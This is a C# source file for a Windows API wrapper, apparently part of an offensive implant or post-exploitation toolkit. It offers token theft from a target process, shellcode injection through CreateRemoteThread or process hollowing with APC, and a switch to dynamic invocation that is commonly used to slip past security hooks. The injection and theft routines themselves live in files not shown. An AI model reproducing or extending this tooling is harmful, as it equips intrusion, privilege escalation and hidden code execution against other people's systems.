using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI.Wrapper;

namespace WinAPI
{
    public class APIWrapperConfig
    {
        public APIAccessType PreferedAccessType { get; set; } = APIAccessType.DInvoke;
        public InjectionMethod PreferedInjectionMethod { get; set; } = InjectionMethod.CreateRemoteThread;
    }

    public class APIWrapper
    {
        public static APIWrapperConfig Config { get; private set; } = new APIWrapperConfig();

        public static IntPtr StealToken(int processId)
        {
            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                return PInvoke.Wrapper.StealToken(processId);
            else
                return DInvoke.Wrapper.StealToken(processId);
        }

        public static ProcessCreationResult CreateProcess(ProcessCreationParameters parms)
        {
            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                return PInvoke.Wrapper.CreateProcess(parms);
            else
                return DInvoke.Wrapper.CreateProcess(parms);
        }

        public static string ReadPipeToEnd(IntPtr pipeHandle, Action<string> callback = null, uint buffSize = 1024)
        {
            string output = string.Empty;
            string chunck = string.Empty;
            //var process = System.Diagnostics.Process.GetProcessById(processId);
            //if (process == null)
            //    return output;


            byte[] b = null;
            /*while (!process.HasExited)
            {
                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    b = PInvoke.Wrapper.ReadFromPipe(pipeHandle, buffSize);
                else
                    b = DInvoke.Wrapper.ReadFromPipe(pipeHandle, buffSize);

                if (b != null)
                {
                    chunck = Encoding.UTF8.GetString(b);
                    output += chunck;
                    callback?.Invoke(chunck);
                }
                Thread.Sleep(100);
            }

           
            if (b != null)
            {
                chunck = Encoding.UTF8.GetString(b);
                output += chunck;
                callback?.Invoke(chunck);
            }*/

            //while (!process.HasExited)
            while (true)
            {
                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    b = PInvoke.Wrapper.ReadFromPipe(pipeHandle, buffSize);
                else
                    b = DInvoke.Wrapper.ReadFromPipe(pipeHandle, buffSize); ;
                if (b != null)
                {
                    chunck = Encoding.UTF8.GetString(b);
                    output += chunck;
                    callback?.Invoke(chunck);
                }
                else
                    break;
                Thread.Sleep(50);
            }

            return output;
        }

        public static void Inject(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, uint entrypointOffset = 0, InjectionMethod? injectMethod = null)
        {
            if (injectMethod == null)
                injectMethod = Config.PreferedInjectionMethod;
            switch (injectMethod)
            {
                case InjectionMethod.CreateRemoteThread:
                    if (Config.PreferedAccessType == APIAccessType.PInvoke)
                        PInvoke.Wrapper.InjectCreateRemoteThread(processHandle, threadHandle, shellcode, (int)entrypointOffset);
                    else
                        DInvoke.Wrapper.InjectCreateRemoteThread(processHandle, threadHandle, shellcode, (int)entrypointOffset);
                    return;
                case InjectionMethod.ProcessHollowingWithAPC:
                    if (Config.PreferedAccessType == APIAccessType.PInvoke)
                        PInvoke.Wrapper.InjectProcessHollowingWithAPC(processHandle, threadHandle, shellcode, (int)entrypointOffset);
                    else
                        DInvoke.Wrapper.InjectProcessHollowingWithAPC(processHandle, threadHandle, shellcode, (int)entrypointOffset);
                    return;
            }
        }

        public static void KillProcess(int pid)
        {
            try
            {
                using (var process = Process.GetProcessById(pid))
                {
                    if (process == null)
                        return;

                    if (!process.HasExited)
                        process.Kill();
                }
            }
            catch { }
        }

        public static bool CloseHandle(IntPtr handle)
        {
            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                return PInvoke.Wrapper.CloseHandle(handle);
            else
                return DInvoke.Wrapper.CloseHandle(handle);
        }

    }
}
